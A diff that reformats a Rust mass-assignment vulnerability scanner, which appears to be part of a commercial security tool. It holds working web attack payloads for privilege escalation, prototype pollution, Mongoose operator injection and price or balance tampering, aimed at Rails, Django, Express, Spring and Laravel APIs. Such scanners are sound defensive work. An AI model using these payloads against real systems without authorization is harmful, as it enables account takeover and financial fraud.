@@ -61,7 +61,6 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
-
 use crate::detection_helpers::AppCharacteristics;
 use crate::http_client::HttpClient;
 use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
@@ -205,7 +204,9 @@ impl AdvancedMassAssignmentScanner {
 
         // Phase 9: Financial field manipulation
         if vulnerabilities.is_empty() {
-            let (vulns, tests) = self.test_financial_field_manipulation(url, &context).await?;
+            let (vulns, tests) = self
+                .test_financial_field_manipulation(url, &context)
+                .await?;
             vulnerabilities.extend(vulns);
             tests_run += tests;
         }
@@ -241,7 +242,10 @@ impl AdvancedMassAssignmentScanner {
     ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         // Skip if not an API endpoint
         if !characteristics.is_api && !self.looks_like_data_endpoint(url) {
-            debug!("[MassAssignment-Advanced] Skipping non-API endpoint: {}", url);
+            debug!(
+                "[MassAssignment-Advanced] Skipping non-API endpoint: {}",
+                url
+            );
             return Ok((Vec::new(), 0));
         }
 
@@ -412,9 +416,7 @@ impl AdvancedMassAssignmentScanner {
             "/subscription",
         ];
 
-        modification_patterns
-            .iter()
-            .any(|p| url_lower.contains(p))
+        modification_patterns.iter().any(|p| url_lower.contains(p))
     }
 
     /// Check if URL looks like a data endpoint
@@ -490,8 +492,7 @@ impl AdvancedMassAssignmentScanner {
             let json_payloads = self.generate_nested_json_payloads();
 
             for (payload, technique) in json_payloads {
-                let headers =
-                    vec![("Content-Type".to_string(), "application/json".to_string())];
+                let headers = vec![("Content-Type".to_string(), "application/json".to_string())];
 
                 match self
                     .http_client
@@ -538,28 +539,66 @@ impl AdvancedMassAssignmentScanner {
     fn generate_nested_url_payloads(&self) -> Vec<(String, String)> {
         vec![
             // 2-level bracket notation
-            ("user[role]=admin".to_string(), "2-level: user[role]".to_string()),
-            ("user[isAdmin]=true".to_string(), "2-level: user[isAdmin]".to_string()),
-            ("user[admin]=1".to_string(), "2-level: user[admin]".to_string()),
-            ("profile[admin]=true".to_string(), "2-level: profile[admin]".to_string()),
-            ("account[verified]=true".to_string(), "2-level: account[verified]".to_string()),
-
+            (
+                "user[role]=admin".to_string(),
+                "2-level: user[role]".to_string(),
+            ),
+            (
+                "user[isAdmin]=true".to_string(),
+                "2-level: user[isAdmin]".to_string(),
+            ),
+            (
+                "user[admin]=1".to_string(),
+                "2-level: user[admin]".to_string(),
+            ),
+            (
+                "profile[admin]=true".to_string(),
+                "2-level: profile[admin]".to_string(),
+            ),
+            (
+                "account[verified]=true".to_string(),
+                "2-level: account[verified]".to_string(),
+            ),
             // 3-level bracket notation
-            ("user[profile][role]=admin".to_string(), "3-level: user[profile][role]".to_string()),
-            ("user[permissions][admin]=true".to_string(), "3-level: user[permissions][admin]".to_string()),
-            ("account[settings][role]=admin".to_string(), "3-level: account[settings][role]".to_string()),
-            ("profile[data][verified]=true".to_string(), "3-level: profile[data][verified]".to_string()),
-
+            (
+                "user[profile][role]=admin".to_string(),
+                "3-level: user[profile][role]".to_string(),
+            ),
+            (
+                "user[permissions][admin]=true".to_string(),
+                "3-level: user[permissions][admin]".to_string(),
+            ),
+            (
+                "account[settings][role]=admin".to_string(),
+                "3-level: account[settings][role]".to_string(),
+            ),
+            (
+                "profile[data][verified]=true".to_string(),
+                "3-level: profile[data][verified]".to_string(),
+            ),
             // 4-level bracket notation
-            ("user[profile][role][level]=admin".to_string(), "4-level: user[profile][role][level]".to_string()),
-            ("account[user][permissions][admin]=true".to_string(), "4-level: account[user][permissions][admin]".to_string()),
-
+            (
+                "user[profile][role][level]=admin".to_string(),
+                "4-level: user[profile][role][level]".to_string(),
+            ),
+            (
+                "account[user][permissions][admin]=true".to_string(),
+                "4-level: account[user][permissions][admin]".to_string(),
+            ),
             // 5-level bracket notation (for deeply nested APIs)
-            ("data[user][profile][permissions][admin]=true".to_string(), "5-level: data[user][profile][permissions][admin]".to_string()),
-
+            (
+                "data[user][profile][permissions][admin]=true".to_string(),
+                "5-level: data[user][profile][permissions][admin]".to_string(),
+            ),
             // With unique marker for verification
-            (format!("user[{}]=injected", self.test_marker), format!("marker: user[{}]", self.test_marker)),
-            (format!("user[profile][{}]=injected", self.test_marker), format!("marker: user[profile][{}]", self.test_marker)),
+            (
+                format!("user[{}]=injected", self.test_marker),
+                format!("marker: user[{}]", self.test_marker),
+            ),
+            (
+                format!("user[profile][{}]=injected", self.test_marker),
+                format!("marker: user[profile][{}]", self.test_marker),
+            ),
         ]
     }
 
@@ -578,7 +617,6 @@ impl AdvancedMassAssignmentScanner {
                 json!({"profile": {"admin": true}}),
                 "2-level JSON: profile.admin".to_string(),
             ),
-
             // 3-level nesting
             (
                 json!({"user": {"profile": {"role": "admin"}}}),
@@ -592,7 +630,6 @@ impl AdvancedMassAssignmentScanner {
                 json!({"account": {"settings": {"verified": true}}}),
                 "3-level JSON: account.settings.verified".to_string(),
             ),
-
             // 4-level nesting
             (
                 json!({"user": {"profile": {"permissions": {"admin": true}}}}),
@@ -602,13 +639,11 @@ impl AdvancedMassAssignmentScanner {
                 json!({"account": {"user": {"role": {"level": "admin"}}}}),
                 "4-level JSON: account.user.role.level".to_string(),
             ),
-
             // 5-level nesting (for deeply nested APIs)
             (
                 json!({"data": {"user": {"profile": {"permissions": {"admin": true}}}}}),
                 "5-level JSON: data.user.profile.permissions.admin".to_string(),
             ),
-
             // With marker
             (
                 json!({"user": {self.test_marker.clone(): "injected"}}),
@@ -637,17 +672,20 @@ impl AdvancedMassAssignmentScanner {
             ("user.admin=1", "dot: user.admin"),
             ("profile.admin=true", "dot: profile.admin"),
             ("account.verified=true", "dot: account.verified"),
-
             // Deeper dot notation
             ("user.profile.role=admin", "dot: user.profile.role"),
             ("user.permissions.admin=true", "dot: user.permissions.admin"),
             ("account.settings.role=admin", "dot: account.settings.role"),
             ("profile.data.verified=true", "dot: profile.data.verified"),
-
             // Very deep dot notation
-            ("user.profile.permissions.admin=true", "dot: user.profile.permissions.admin"),
-            ("data.user.account.role=admin", "dot: data.user.account.role"),
-
+            (
+                "user.profile.permissions.admin=true",
+                "dot: user.profile.permissions.admin",
+            ),
+            (
+                "data.user.account.role=admin",
+                "dot: data.user.account.role",
+            ),
             // Financial fields
             ("user.balance=999999", "dot: user.balance"),
             ("account.credits=999999", "dot: account.credits"),
@@ -703,7 +741,11 @@ impl AdvancedMassAssignmentScanner {
         };
 
         if let Ok(response) = self.http_client.get(&test_url).await {
-            if response.body.to_lowercase().contains(&self.test_marker.to_lowercase()) {
+            if response
+                .body
+                .to_lowercase()
+                .contains(&self.test_marker.to_lowercase())
+            {
                 vulnerabilities.push(self.create_vulnerability(
                     url,
                     "Dot Notation Property Pollution (Verified)",
@@ -738,30 +780,36 @@ impl AdvancedMassAssignmentScanner {
         let array_payloads = vec![
             // Simple array injection
             ("roles[]=admin&roles[]=user", "array: roles[]"),
-            ("permissions[]=admin&permissions[]=read", "array: permissions[]"),
+            (
+                "permissions[]=admin&permissions[]=read",
+                "array: permissions[]",
+            ),
             ("groups[]=administrators&groups[]=users", "array: groups[]"),
-
             // Indexed array injection
-            ("permissions[0]=read&permissions[1]=write&permissions[2]=admin", "indexed: permissions[n]"),
+            (
+                "permissions[0]=read&permissions[1]=write&permissions[2]=admin",
+                "indexed: permissions[n]",
+            ),
             ("roles[0]=user&roles[1]=admin", "indexed: roles[n]"),
-
             // Nested array objects
             ("users[0][role]=admin", "nested array: users[0][role]"),
             ("users[0][isAdmin]=true", "nested array: users[0][isAdmin]"),
             ("items[0][price]=0", "nested array: items[0][price]"),
             ("orders[0][amount]=0", "nested array: orders[0][amount]"),
-
             // Deep nested arrays
-            ("data[users][0][role]=admin", "deep array: data[users][0][role]"),
-            ("accounts[0][permissions][0]=admin", "deep array: accounts[0][permissions][0]"),
-
+            (
+                "data[users][0][role]=admin",
+                "deep array: data[users][0][role]",
+            ),
+            (
+                "accounts[0][permissions][0]=admin",
+                "deep array: accounts[0][permissions][0]",
+            ),
             // Negative indices (some frameworks vulnerable)
             ("users[-1][role]=admin", "negative index: users[-1][role]"),
             ("items[-1][admin]=true", "negative index: items[-1][admin]"),
-
             // Large indices (potential DoS or bypass)
             ("users[9999][role]=admin", "large index: users[9999][role]"),
-
             // PHP-style array append
             ("role[]=admin", "PHP append: role[]"),
             ("admin[]=true", "PHP append: admin[]"),
@@ -812,8 +860,14 @@ impl AdvancedMassAssignmentScanner {
         {
             let json_array_payloads = vec![
                 (json!({"roles": ["admin", "user"]}), "JSON array: roles"),
-                (json!({"permissions": ["read", "write", "admin"]}), "JSON array: permissions"),
-                (json!({"user": {"roles": ["admin"]}}), "JSON nested array: user.roles"),
+                (
+                    json!({"permissions": ["read", "write", "admin"]}),
+                    "JSON array: permissions",
+                ),
+                (
+                    json!({"user": {"roles": ["admin"]}}),
+                    "JSON nested array: user.roles",
+                ),
                 (
                     json!({"users": [{"role": "admin"}]}),
                     "JSON object array: users[].role",
@@ -825,8 +879,7 @@ impl AdvancedMassAssignmentScanner {
             ];
 
             for (payload, technique) in json_array_payloads {
-                let headers =
-                    vec![("Content-Type".to_string(), "application/json".to_string())];
+                let headers = vec![("Content-Type".to_string(), "application/json".to_string())];
 
                 match self
                     .http_client
@@ -894,7 +947,6 @@ impl AdvancedMassAssignmentScanner {
                 json!({"constructor": {"prototype": {"admin": true}}}),
                 "constructor pollution merge",
             ),
-
             // Deep merge with overwrite
             (
                 json!({
@@ -909,7 +961,6 @@ impl AdvancedMassAssignmentScanner {
                 }),
                 "deep 4-level merge",
             ),
-
             // Merge with arrays and objects
             (
                 json!({
@@ -920,7 +971,6 @@ impl AdvancedMassAssignmentScanner {
                 }),
                 "mixed array-object merge",
             ),
-
             // Prototype chain manipulation
             (
                 json!({
@@ -929,7 +979,6 @@ impl AdvancedMassAssignmentScanner {
                 }),
                 "prototype + object merge",
             ),
-
             // Recursive merge attempt
             (
                 json!({
@@ -944,7 +993,6 @@ impl AdvancedMassAssignmentScanner {
                 }),
                 "recursive deep merge",
             ),
-
             // With marker for verification
             (
                 json!({
@@ -1055,26 +1103,39 @@ impl AdvancedMassAssignmentScanner {
     }
 
     /// Rails-specific mass assignment tests (params.permit bypass)
-    async fn test_rails_specific(
-        &self,
-        url: &str,
-    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+    async fn test_rails_specific(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
 
         let rails_payloads = vec![
             // Rails nested attributes bypass
             ("user[admin]=true", "Rails: direct admin"),
-            ("user[attributes][admin]=true", "Rails: nested attributes admin"),
-            ("user[user_attributes][role]=admin", "Rails: user_attributes"),
-            ("model[_destroy]=false&model[admin]=true", "Rails: _destroy bypass"),
+            (
+                "user[attributes][admin]=true",
+                "Rails: nested attributes admin",
+            ),
+            (
+                "user[user_attributes][role]=admin",
+                "Rails: user_attributes",
+            ),
+            (
+                "model[_destroy]=false&model[admin]=true",
+                "Rails: _destroy bypass",
+            ),
             ("user[role_ids][]=1", "Rails: has_many through bypass"),
-
             // Rails accepts_nested_attributes_for bypass
-            ("user[profile_attributes][verified]=true", "Rails: profile_attributes"),
-            ("order[line_items_attributes][0][price]=0", "Rails: line_items_attributes"),
-
+            (
+                "user[profile_attributes][verified]=true",
+                "Rails: profile_attributes",
+            ),
+            (
+                "order[line_items_attributes][0][price]=0",
+                "Rails: line_items_attributes",
+            ),
             // Rails polymorphic association abuse
-            ("comment[commentable_type]=Admin&comment[commentable_id]=1", "Rails: polymorphic abuse"),
+            (
+                "comment[commentable_type]=Admin&comment[commentable_id]=1",
+                "Rails: polymorphic abuse",
+            ),
         ];
 
         let tests_run = rails_payloads.len();
@@ -1092,7 +1153,10 @@ impl AdvancedMassAssignmentScanner {
                         url,
                         "Rails Strong Parameters Bypass",
                         payload,
-                        &format!("Rails strong parameters (params.permit) bypassed. Technique: {}", technique),
+                        &format!(
+                            "Rails strong parameters (params.permit) bypassed. Technique: {}",
+                            technique
+                        ),
                         "Successfully bypassed Rails parameter protection",
                         Severity::Critical,
                         Confidence::High,
@@ -1108,10 +1172,7 @@ impl AdvancedMassAssignmentScanner {
     }
 
     /// Django-specific mass assignment tests (serializer bypass)
-    async fn test_django_specific(
-        &self,
-        url: &str,
-    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+    async fn test_django_specific(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
 
         let django_payloads = vec![
@@ -1120,8 +1181,10 @@ impl AdvancedMassAssignmentScanner {
             (json!({"is_superuser": true}), "DRF: is_superuser"),
             (json!({"is_active": true}), "DRF: is_active"),
             (json!({"groups": [1]}), "DRF: groups assignment"),
-            (json!({"user_permissions": [1, 2, 3]}), "DRF: user_permissions"),
-
+            (
+                json!({"user_permissions": [1, 2, 3]}),
+                "DRF: user_permissions",
+            ),
             // Django model field bypass
             (json!({"password": "admin123"}), "DRF: direct password"),
             (json!({"pk": 1}), "DRF: primary key manipulation"),
@@ -1142,7 +1205,10 @@ impl AdvancedMassAssignmentScanner {
                         url,
                         "Django Serializer Bypass",
                         &payload.to_string(),
-                        &format!("Django REST Framework serializer bypassed. Technique: {}", technique),
+                        &format!(
+                            "Django REST Framework serializer bypassed. Technique: {}",
+                            technique
+                        ),
                         "Successfully bypassed Django serializer protection",
                         Severity::Critical,
                         Confidence::High,
@@ -1166,16 +1232,32 @@ impl AdvancedMassAssignmentScanner {
 
         let express_payloads = vec![
             // Express body-parser exploitation
-            (json!({"__proto__": {"isAdmin": true}}), "Express: __proto__ pollution"),
-            (json!({"constructor": {"prototype": {"admin": true}}}), "Express: constructor pollution"),
-            (json!({"isAdmin": true, "role": "admin"}), "Express: direct assignment"),
-
+            (
+                json!({"__proto__": {"isAdmin": true}}),
+                "Express: __proto__ pollution",
+            ),
+            (
+                json!({"constructor": {"prototype": {"admin": true}}}),
+                "Express: constructor pollution",
+            ),
+            (
+                json!({"isAdmin": true, "role": "admin"}),
+                "Express: direct assignment",
+            ),
             // Mongoose schema bypass
-            (json!({"$set": {"role": "admin"}}), "Express/Mongoose: $set injection"),
-            (json!({"$unset": {"password": ""}}), "Express/Mongoose: $unset"),
-
+            (
+                json!({"$set": {"role": "admin"}}),
+                "Express/Mongoose: $set injection",
+            ),
+            (
+                json!({"$unset": {"password": ""}}),
+                "Express/Mongoose: $unset",
+            ),
             // Express query pollution
-            (json!({"$where": "this.admin = true"}), "Express/Mongoose: $where"),
+            (
+                json!({"$where": "this.admin = true"}),
+                "Express/Mongoose: $where",
+            ),
         ];
 
         let tests_run = express_payloads.len();
@@ -1192,7 +1274,10 @@ impl AdvancedMassAssignmentScanner {
                         url,
                         "Express Body Parser Exploitation",
                         &payload.to_string(),
-                        &format!("Express body parser allows mass assignment. Technique: {}", technique),
+                        &format!(
+                            "Express body parser allows mass assignment. Technique: {}",
+                            technique
+                        ),
                         "Successfully exploited Express body parser",
                         Severity::Critical,
                         Confidence::High,
@@ -1208,25 +1293,35 @@ impl AdvancedMassAssignmentScanner {
     }
 
     /// Spring-specific mass assignment tests (Jackson annotation bypass)
-    async fn test_spring_specific(
-        &self,
-        url: &str,
-    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
+    async fn test_spring_specific(&self, url: &str) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
         let mut vulnerabilities = Vec::new();
 
         let spring_payloads = vec![
             // Spring/Jackson bypass attempts
             (json!({"admin": true}), "Spring: direct admin"),
-            (json!({"authorities": [{"authority": "ROLE_ADMIN"}]}), "Spring: authorities"),
+            (
+                json!({"authorities": [{"authority": "ROLE_ADMIN"}]}),
+                "Spring: authorities",
+            ),
             (json!({"roles": ["ADMIN"]}), "Spring: roles array"),
-            (json!({"enabled": true, "accountNonLocked": true}), "Spring: account status"),
-
+            (
+                json!({"enabled": true, "accountNonLocked": true}),
+                "Spring: account status",
+            ),
             // Spring class injection
-            (json!({"class": {"classLoader": {}}}), "Spring: class loader injection"),
-
+            (
+                json!({"class": {"classLoader": {}}}),
+                "Spring: class loader injection",
+            ),
             // Spring nested binding
-            (json!({"user": {"admin": true}}), "Spring: nested user.admin"),
-            (json!({"userDetails": {"authorities": [{"authority": "ADMIN"}]}}), "Spring: userDetails"),
+            (
+                json!({"user": {"admin": true}}),
+                "Spring: nested user.admin",
+            ),
+            (
+                json!({"userDetails": {"authorities": [{"authority": "ADMIN"}]}}),
+                "Spring: userDetails",
+            ),
         ];
 
         let tests_run = spring_payloads.len();
@@ -1243,7 +1338,10 @@ impl AdvancedMassAssignmentScanner {
                         url,
                         "Spring Jackson Annotation Bypass",
                         &payload.to_string(),
-                        &format!("Spring Jackson binding allows mass assignment. Technique: {}", technique),
+                        &format!(
+                            "Spring Jackson binding allows mass assignment. Technique: {}",
+                            technique
+                        ),
                         "Successfully bypassed Spring Jackson protection",
                         Severity::Critical,
                         Confidence::High,
@@ -1270,14 +1368,21 @@ impl AdvancedMassAssignmentScanner {
             (json!({"is_admin": true}), "Laravel: is_admin"),
             (json!({"role": "admin"}), "Laravel: role"),
             (json!({"role_id": 1}), "Laravel: role_id"),
-            (json!({"email_verified_at": "2024-01-01T00:00:00Z"}), "Laravel: email_verified_at"),
-
+            (
+                json!({"email_verified_at": "2024-01-01T00:00:00Z"}),
+                "Laravel: email_verified_at",
+            ),
             // Laravel relationship bypass
             (json!({"roles": [{"id": 1}]}), "Laravel: roles relationship"),
-            (json!({"permissions": [1, 2, 3]}), "Laravel: permissions sync"),
-
+            (
+                json!({"permissions": [1, 2, 3]}),
+                "Laravel: permissions sync",
+            ),
             // Laravel pivot data manipulation
-            (json!({"pivot": {"role_id": 1, "is_admin": true}}), "Laravel: pivot data"),
+            (
+                json!({"pivot": {"role_id": 1, "is_admin": true}}),
+                "Laravel: pivot data",
+            ),
         ];
 
         let tests_run = laravel_payloads.len();
@@ -1294,7 +1399,10 @@ impl AdvancedMassAssignmentScanner {
                         url,
                         "Laravel Eloquent Mass Assignment Bypass",
                         &payload.to_string(),
-                        &format!("Laravel Eloquent $fillable/$guarded bypassed. Technique: {}", technique),
+                        &format!(
+                            "Laravel Eloquent $fillable/$guarded bypassed. Technique: {}",
+                            technique
+                        ),
                         "Successfully bypassed Laravel Eloquent protection",
                         Severity::Critical,
                         Confidence::High,
@@ -1338,7 +1446,10 @@ impl AdvancedMassAssignmentScanner {
                         url,
                         "Mass Assignment Vulnerability",
                         &payload.to_string(),
-                        &format!("Mass assignment vulnerability detected. Technique: {}", technique),
+                        &format!(
+                            "Mass assignment vulnerability detected. Technique: {}",
+                            technique
+                        ),
                         "Successfully exploited mass assignment",
                         Severity::High,
                         Confidence::Medium,
@@ -1373,28 +1484,24 @@ impl AdvancedMassAssignmentScanner {
             ("role", "superuser"),
             ("userRole", "admin"),
             ("user_role", "admin"),
-
             // Boolean admin flags
             ("isAdmin", "true"),
             ("is_admin", "true"),
             ("admin", "true"),
             ("superuser", "true"),
             ("is_superuser", "true"),
-
             // Permission fields
             ("permissions", "admin"),
             ("permission", "all"),
             ("access_level", "admin"),
             ("accessLevel", "10"),
             ("privilege", "admin"),
-
             // Verification fields
             ("verified", "true"),
             ("is_verified", "true"),
             ("email_verified", "true"),
             ("phone_verified", "true"),
             ("account_verified", "true"),
-
             // Status fields
             ("active", "true"),
             ("is_active", "true"),
@@ -1424,7 +1531,10 @@ impl AdvancedMassAssignmentScanner {
                             "User privileges can be escalated by injecting {}={}. Framework: {:?}",
                             field, value, context.framework
                         ),
-                        &format!("Successfully escalated privileges using {}={}", field, value),
+                        &format!(
+                            "Successfully escalated privileges using {}={}",
+                            field, value
+                        ),
                         Severity::Critical,
                         Confidence::High,
                         "CWE-915",
@@ -1488,7 +1598,10 @@ impl AdvancedMassAssignmentScanner {
                             This may lead to IDOR or privilege escalation. Framework: {:?}",
                             field, value, context.framework
                         ),
-                        &format!("Successfully manipulated ownership using {}={}", field, value),
+                        &format!(
+                            "Successfully manipulated ownership using {}={}",
+                            field, value
+                        ),
                         Severity::High,
                         Confidence::Medium,
                         "CWE-915",
@@ -1521,7 +1634,6 @@ impl AdvancedMassAssignmentScanner {
             ("credits", "999999"),
             ("points", "999999"),
             ("coins", "999999"),
-
             // Price manipulation
             ("price", "0"),
             ("amount", "0"),
@@ -1531,7 +1643,6 @@ impl AdvancedMassAssignmentScanner {
             ("fee", "0"),
             ("discount", "100"),
             ("discount_percent", "100"),
-
             // Subscription/tier
             ("subscription", "premium"),
             ("tier", "enterprise"),
@@ -1539,7 +1650,6 @@ impl AdvancedMassAssignmentScanner {
             ("subscription_type", "lifetime"),
             ("is_premium", "true"),
             ("is_pro", "true"),
-
             // Limits
             ("limit", "999999"),
             ("quota", "999999"),
@@ -1558,7 +1668,10 @@ impl AdvancedMassAssignmentScanner {
 
             if let Ok(response) = self.http_client.get(&test_url).await {
                 if self.verify_financial_manipulation(&response.body, field, value) {
-                    let severity = if field.contains("price") || field.contains("amount") || field.contains("balance") {
+                    let severity = if field.contains("price")
+                        || field.contains("amount")
+                        || field.contains("balance")
+                    {
                         Severity::Critical
                     } else {
                         Severity::High
@@ -1573,7 +1686,10 @@ impl AdvancedMassAssignmentScanner {
                             This may lead to financial fraud. Framework: {:?}",
                             field, value, context.framework
                         ),
-                        &format!("Successfully manipulated financial field {}={}", field, value),
+                        &format!(
+                            "Successfully manipulated financial field {}={}",
+                            field, value
+                        ),
                         severity,
                         Confidence::High,
                         "CWE-915",
@@ -1668,13 +1784,21 @@ impl AdvancedMassAssignmentScanner {
 
         // Check for privilege escalation patterns
         if payload.contains("role]=admin") || payload.contains("role=admin") {
-            if body_lower.contains("\"role\":\"admin\"") || body_lower.contains("\"role\": \"admin\"") {
+            if body_lower.contains("\"role\":\"admin\"")
+                || body_lower.contains("\"role\": \"admin\"")
+            {
                 return true;
             }
         }
 
-        if payload.contains("admin]=true") || payload.contains("admin=true") || payload.contains("admin]=1") {
-            if body_lower.contains("\"admin\":true") || body_lower.contains("\"admin\": true") || body_lower.contains("\"admin\":1") {
+        if payload.contains("admin]=true")
+            || payload.contains("admin=true")
+            || payload.contains("admin]=1")
+        {
+            if body_lower.contains("\"admin\":true")
+                || body_lower.contains("\"admin\": true")
+                || body_lower.contains("\"admin\":1")
+            {
                 return true;
             }
         }
@@ -1880,7 +2004,8 @@ impl AdvancedMassAssignmentScanner {
         let body_lower = body.to_lowercase();
 
         // Check for staff/superuser flags
-        if body_lower.contains("\"is_staff\":true") || body_lower.contains("\"is_superuser\":true") {
+        if body_lower.contains("\"is_staff\":true") || body_lower.contains("\"is_superuser\":true")
+        {
             return true;
         }
 
@@ -2033,7 +2158,7 @@ impl AdvancedMassAssignmentScanner {
             false_positive: false,
             remediation: self.get_remediation(),
             discovered_at: chrono::Utc::now().to_rfc3339(),
-                ml_data: None,
+            ml_data: None,
         }
     }
 
@@ -2162,22 +2287,14 @@ mod tests {
         ));
 
         // Test role injection
-        assert!(scanner.verify_nested_injection(
-            r#"{"user":{"role":"admin"}}"#,
-            "user[role]=admin"
-        ));
+        assert!(scanner.verify_nested_injection(r#"{"user":{"role":"admin"}}"#, "user[role]=admin"));
 
         // Test admin flag injection
-        assert!(scanner.verify_nested_injection(
-            r#"{"user":{"admin":true}}"#,
-            "user[admin]=true"
-        ));
+        assert!(scanner.verify_nested_injection(r#"{"user":{"admin":true}}"#, "user[admin]=true"));
 
         // Test isAdmin injection
-        assert!(scanner.verify_nested_injection(
-            r#"{"profile":{"isAdmin":true}}"#,
-            "profile[isAdmin]=true"
-        ));
+        assert!(scanner
+            .verify_nested_injection(r#"{"profile":{"isAdmin":true}}"#, "profile[isAdmin]=true"));
     }
 
     #[test]
@@ -2185,65 +2302,36 @@ mod tests {
         let scanner = create_test_scanner();
 
         // HTML should not trigger
-        assert!(!scanner.verify_nested_injection(
-            "<html><body>admin panel</body></html>",
-            "user[role]=admin"
-        ));
+        assert!(!scanner
+            .verify_nested_injection("<html><body>admin panel</body></html>", "user[role]=admin"));
 
         // Plain text should not trigger
-        assert!(!scanner.verify_nested_injection(
-            "Welcome admin user",
-            "user[admin]=true"
-        ));
+        assert!(!scanner.verify_nested_injection("Welcome admin user", "user[admin]=true"));
 
         // Unrelated JSON should not trigger
-        assert!(!scanner.verify_nested_injection(
-            r#"{"message":"success"}"#,
-            "user[role]=admin"
-        ));
+        assert!(!scanner.verify_nested_injection(r#"{"message":"success"}"#, "user[role]=admin"));
     }
 
     #[test]
     fn test_privilege_escalation_verification() {
         let scanner = create_test_scanner();
 
-        assert!(scanner.verify_privilege_escalation(
-            r#"{"role":"admin"}"#,
-            "role",
-            "admin"
-        ));
+        assert!(scanner.verify_privilege_escalation(r#"{"role":"admin"}"#, "role", "admin"));
 
-        assert!(scanner.verify_privilege_escalation(
-            r#"{"isAdmin":true}"#,
-            "isAdmin",
-            "true"
-        ));
+        assert!(scanner.verify_privilege_escalation(r#"{"isAdmin":true}"#, "isAdmin", "true"));
 
-        assert!(!scanner.verify_privilege_escalation(
-            r#"{"role":"user"}"#,
-            "role",
-            "admin"
-        ));
+        assert!(!scanner.verify_privilege_escalation(r#"{"role":"user"}"#, "role", "admin"));
     }
 
     #[test]
     fn test_array_pollution_verification() {
         let scanner = create_test_scanner();
 
-        assert!(scanner.verify_array_pollution(
-            r#"[{"admin":true}]"#,
-            "users[0][admin]=true"
-        ));
+        assert!(scanner.verify_array_pollution(r#"[{"admin":true}]"#, "users[0][admin]=true"));
 
-        assert!(scanner.verify_array_pollution(
-            r#"[{"role":"admin"}]"#,
-            "users[0][role]=admin"
-        ));
+        assert!(scanner.verify_array_pollution(r#"[{"role":"admin"}]"#, "users[0][role]=admin"));
 
-        assert!(!scanner.verify_array_pollution(
-            r#"{"message":"ok"}"#,
-            "users[0][admin]=true"
-        ));
+        assert!(!scanner.verify_array_pollution(r#"{"message":"ok"}"#, "users[0][admin]=true"));
     }
 
     #[test]
@@ -2341,16 +2429,10 @@ mod tests {
 
         let payload = json!({"user": {"role": "admin"}});
 
-        assert!(scanner.verify_deep_merge(
-            r#"{"user":{"role":"admin"}}"#,
-            &payload
-        ));
+        assert!(scanner.verify_deep_merge(r#"{"user":{"role":"admin"}}"#, &payload));
 
         // Prototype pollution detection
         let proto_payload = json!({"__proto__": {"admin": true}});
-        assert!(scanner.verify_deep_merge(
-            r#"{"__proto__":{"admin":true}}"#,
-            &proto_payload
-        ));
+        assert!(scanner.verify_deep_merge(r#"{"__proto__":{"admin":true}}"#, &proto_payload));
     }
 }
